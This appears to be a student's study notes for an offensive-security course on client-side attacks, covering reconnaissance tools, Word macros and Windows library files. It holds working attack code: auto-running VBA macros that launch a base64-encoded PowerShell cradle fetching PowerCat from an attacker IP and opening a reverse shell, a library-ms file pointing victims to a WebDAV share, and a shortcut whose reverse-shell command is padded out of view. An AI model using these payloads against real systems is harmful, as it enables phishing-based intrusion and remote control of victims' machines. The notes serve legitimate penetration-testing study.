
# Target Reconnaissance
## Information Gathering

- exiftool
	- metadata of 'supported' files
	- exiftool -a -u brochure.pdf
		- -a to show duplicate tags
		- -u to display unkown tags

## Client Fingerprinting

- theHarvester
	- extracts emails / very important
	- used for HTML Application (HTA) attacks
- Canarytokens
	- generates links with embedded tokens or urls
	- grabs browser, IP, and OS info
- Grabify
	- IP logger
- finerprint.js
	- fingerprinting libraries

## Exploiting Microsoft Office
- MOTW (Mark of the Web)
	- Enables protected view
		- which then means they will have to click learn more then Unblock in file properties

## Leveraging Microsoft Word Macros

- ActiveX Object
	-  provide access to underlying OS commands
- WScript
	- uses ActiveX Objects
- Windows Script Host Shell Object
	- uses WScript
1. Instantiate a Windows Script Host Shell object with Create Object, invoke the Run method for Wscript.Shell
	- Luanches an app on target machine
	- ```
```1. Sub MyMacro()
		2.CreateObject("Wscript.Shell").Run "powershell"
		3. End Sub
````
2. AutoOpen & Document_Open
	- events needs to open doc
	- ```
		Sub AutoOpen()
		
		  MyMacro
		  
		End Sub
		
		Sub Document_Open()
		
		  MyMacro
		  
		End Sub
		
		Sub MyMacro()
		
		  CreateObject("Wscript.Shell").Run "powershell"
		  
		End Sub
``
3.  Add reverse shell macro using PowerCat
	- Use a base64 encoded PowerShell download cradle
	- VBA has 255-character limit
		- must split string into multiple variables
	1. Declare string variabled Str with the Dim Keyword
		- stores PowerShell cradle & command to create a reverse shell 
	2. ```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
``
4. PowerShell command to download PowerCat and execute the reverse shell```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
``
5. Python script to split in 50 characters & combind with Str variable
	- ```
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
``
6. Update macro with split strings
	- ```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
``
7. Start up  nc listener 
	- should recieve get request for PowerCat file
	- nc -lvnp 4444

## Obtaining Code Execution via Windows Library Files
- Library file
	- .Library-ms
- WebDAV
	- windows web server protocol
	- less likely filtered in emails
	- appears as a local directory
- WsgiDAV
	- WebDAV server

1. Download
	- pip3 install wsgidav
		- will install in /home/kali/.local/bin
	- apt-install python3-wsgidav
2. mkdir /home/kali/webdav
3. touch /home/kali/webdav/test.txt
4. wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
	- root = WebDAV share
5. RDP into target
	- xfreerdp
	- xfreerdp /u:username /p:password /v:192.168.0.101
1. Create library file on tgt machine
	1. config.Library-ms
	2. change icon to less suspicious
	3. create XML parameters
		1. Library Description tag
			1. ```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">

</libraryDescription>
2. Name Tag
	- cannot be arbitrary
	- provided by DLL name & index
	- @shell32.dll,-34575_ or @windows.storage.dll,-34582_
3. Version Tag
	- ```
<version>6</version>
``
	- number doesnt matter
4. isLibraryPinned tag
	- specifies if the library is pinned to the navigation page on Windows
	- small detail that helps convince target
	- set to true
5. iconReference Tag
	- what icon is displayed
	- imagesres.dll
		- chooses between all windows icons
		- "-1002" for Documents folder icon
		- "-1003" for Pictures folder icon
	- ```
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	``
	- templateInfo tags
		- contains folderType tags
			- determines the columns & details by default when opening the library
		- specify GUID
			- to look up on Microsoft documentation webpage
			- using Documents GUID
			- ```
	<templateInfo>
	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	``
- searchConnectDescriptionList Tag
	- specify the storage location where our library file points to
	- contains a list of search connectors
		- defined by searchConnectorDescription
	- add isDefaultSaveLocation tag
		- set to true
	- isSupported tag
		- set to true
		[	- URL tag]
			- point to our created WebDAV share 
			- contains simpleLocation Tag
				- user friendly more so than locationProvider element
			- ```
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
``
- Entire XML of library file
	- ```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
``

- Serialized tag
	- windows bae64 encodes URL automatically
	- can result in fails
	- must re-insert XML property data to refresh each time
6. Create shortcut on windows desktop
	- Have it point to Powershell
	- Use download cradle to load PowerCat from our Kali to start reverse shell
	- ```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.145.245:8000/powercat.ps1');
powercat -c 192.168.45.245 -p 4444 -e powershell"
``
	- to hide command in shortcut, use delimeter or benign command to push the reverse shell command out of view
	- WebDAV is writeable
	- mostly likely blocked by AV
	- use python 3 web server to transfer powercat file
- Example 2:
	- cd webdav
	- rm test.txt
	- smbclient //192.168.50.195/share -c 'put config.Library-ms'
